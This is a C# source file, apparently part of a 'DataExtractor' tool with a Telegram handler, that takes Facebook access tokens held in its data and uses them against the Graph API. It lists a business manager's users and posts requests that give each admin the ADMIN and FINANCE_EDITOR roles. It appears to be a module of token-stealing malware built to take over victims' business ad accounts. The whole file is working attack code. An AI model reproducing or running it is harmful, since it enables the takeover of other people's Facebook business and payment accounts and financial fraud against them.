using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using DataExtractor.Core.Exts;
using DataExtractor.Core.Models;
using Newtonsoft.Json;

namespace DataExtractor.Core.Handlers.Fb;

internal class UpdateBmUserHandler
{
	private class MyBMUserJsonModel
	{
		public Datum[] data { get; set; }
	}

	private class Datum
	{
		public string finance_permission { get; set; }

		public string last_name { get; set; }

		public string first_name { get; set; }

		public string id { get; set; }

		public string role { get; set; }
	}

	public void Run(FbData fbData, HttpClient httpClient, TelegramHandler telegramHandler)
	{
		List<AdsAccount> allBmUser = GetAllBmUser(fbData, httpClient);
		foreach (AdsAccount item in allBmUser)
		{
			UpdateFinanceEditor(fbData, httpClient, item);
		}
	}

	private void UpdateFinanceEditor(FbData fbData, HttpClient httpClient, AdsAccount item)
	{
		string text = fbData.FbToken.Tokens.FirstOrDefault((string a) => a.StartsWith("EAAG") || a.StartsWith("EAAA"));
		if (text == null)
		{
			fbData.Log("ko co token de chay get bm_user");
			return;
		}
		fbData.Log("add finance editor to " + item.id + " - " + item.name);
		string url = "https://graph.facebook.com/v14.0/" + item.id + "?access_token=" + text + "&__cppo=1";
		string formData = "__activeScenarioIDs=%5B%5D&__activeScenarios=%5B%5D&__interactionsMetadata=%5B%5D&_reqName=object%3Abusiness_user&_reqSrc=UserServerActions.brands&locale=en_GB&method=post&pretty=0&roles=%5B%22ADMIN%22%2C%22FINANCE_EDITOR%22%5D&suppress_http_code=1&user=" + item.id;
		string text2 = httpClient.PostString(url, formData, "application/x-www-form-urlencoded", new Dictionary<string, string>
		{
			{ "Sec-Fetch-Dest", "empty" },
			{ "Sec-Fetch-Mode", "cors" },
			{ "Sec-Fetch-Site", "same-origin" }
		});
		fbData.Log("du lieu tra ve : " + text2);
		if (string.IsNullOrEmpty(text2))
		{
			fbData.Log("request that bai");
		}
		else if (text2.Contains("error"))
		{
			fbData.Log("request loi");
		}
		else
		{
			fbData.Log("success");
		}
	}

	private List<AdsAccount> GetAllBmUser(FbData fbData, HttpClient httpClient)
	{
		string text = fbData.FbToken.Tokens.FirstOrDefault((string a) => a.StartsWith("EAAG") || a.StartsWith("EAAA"));
		if (text == null)
		{
			fbData.Log("ko co token de chay get bm_user");
			return new List<AdsAccount>();
		}
		string text2 = "https://graph.facebook.com//v14.0/me/business_users?access_token=" + text + "&__cppo=1&_reqName=object%3Abusiness%2Fbusiness_users&_reqSrc=BusinessConnectedConfirmedUsersStore.brands&date_format=U&fields=%5B%22finance_permission%22%2C+%22last_name%22%2C+%22first_name%22%2C+%22role%22%5D&limit=25&locale=en_GB&method=get&pretty=0&sort=name_ascending&suppress_http_code=1";
		string @string = httpClient.GetString(text2, new Dictionary<string, string>
		{
			{ "Sec-Fetch-Dest", "empty" },
			{ "Sec-Fetch-Mode", "cors" },
			{ "Sec-Fetch-Site", "same-origin" }
		});
		if (string.IsNullOrEmpty(@string))
		{
			fbData.Log("request " + text2 + " that bai");
			return new List<AdsAccount>();
		}
		try
		{
			MyBMUserJsonModel myBMUserJsonModel = JsonConvert.DeserializeObject<MyBMUserJsonModel>(@string);
			if (myBMUserJsonModel != null && myBMUserJsonModel.data != null)
			{
				fbData.Log("thanh cong, lay danh sach data chua co finance_permission");
				return (from a in myBMUserJsonModel.data
					where (string.IsNullOrEmpty(a.role) || a.role == "ADMIN") && (string.IsNullOrEmpty(a.finance_permission) || a.finance_permission != "FINANCE_EDITOR")
					select new AdsAccount
					{
						id = a.id,
						name = a.first_name + " " + a.last_name
					}).ToList();
			}
			fbData.Log("du lieu tra ve " + @string);
			return new List<AdsAccount>();
		}
		catch (Exception ex)
		{
			fbData.Log(ex.ToString());
			return new List<AdsAccount>();
		}
	}
}
